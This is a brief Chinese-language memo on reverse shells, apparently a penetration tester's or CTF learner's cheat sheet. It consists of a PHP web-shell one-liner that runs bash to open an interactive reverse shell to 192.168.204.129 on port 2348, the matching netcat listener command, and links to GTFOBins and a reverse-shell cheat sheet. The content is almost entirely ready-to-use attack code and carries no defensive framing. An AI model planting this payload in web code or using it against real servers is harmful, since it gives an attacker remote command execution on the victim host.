# 反弹 Shell 小记

```
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.204.129/2348 0>&1'"); ?>

    sudo nc -lvnp 2348
```

- https://gtfobins.github.io/

- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet